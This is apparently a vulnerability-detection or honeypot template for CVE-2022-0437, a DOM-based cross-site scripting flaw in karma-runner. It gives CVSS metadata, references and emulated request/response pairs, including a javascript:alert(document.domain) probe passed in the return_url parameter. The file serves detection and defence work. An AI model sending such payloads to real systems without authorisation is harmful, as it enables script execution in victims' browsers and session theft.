id: CVE-2022-0437
info:
  name: karma-runner DOM-based Cross-Site Scripting
  author: pikpikcu
  description: NPM karma prior to 6.3.14. contains a DOM-based cross-site Scripting
    vulnerability.
  severity: medium
  impact: 'Successful exploitation of this vulnerability could allow an attacker to
    execute arbitrary JavaScript code in the context of the victim''s browser, leading
    to potential data theft, session hijacking, or defacement of the affected website.

    '
  remediation: 'Upgrade to the latest version of karma-runner that includes proper
    input sanitization to mitigate this vulnerability.

    '
  reference:
  - https://huntr.dev/bounties/64b67ea1-5487-4382-a5f6-e8a95f798885
  - https://github.com/karma-runner/karma/commit/839578c45a8ac42fbc1d72105f97eab77dd3eb8a
  - https://nvd.nist.gov/vuln/detail/CVE-2022-0437
  - https://github.com/karma-runner/karma
  - https://github.com/ARPSyndicate/cvemon
  classification:
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N
    cvss-score: 6.1
    cve-id: CVE-2022-0437
    cwe-id: CWE-79
    epss-score: 0.001
    epss-percentile: 0.40882
    cpe: cpe:2.3:a:karma_project:karma:*:*:*:*:*:node.js:*:*
  metadata:
    max-request: 2
    vendor: karma_project
    product: karma
    framework: node.js
  tags: cve2022,cve,oss,huntr,karma,xss,karma_project,node.js
traps:
- request:
    method: GET
    path: /karma.js
    headers: null
    body: null
  response:
    status_code: 200
    headers: {}
    body: ''
- request:
    method: GET
    path: /?return_url=javascript:alert(document.domain)
    headers: null
    body: null
  response:
    status_code: 200
    headers: {}
    body: Karma
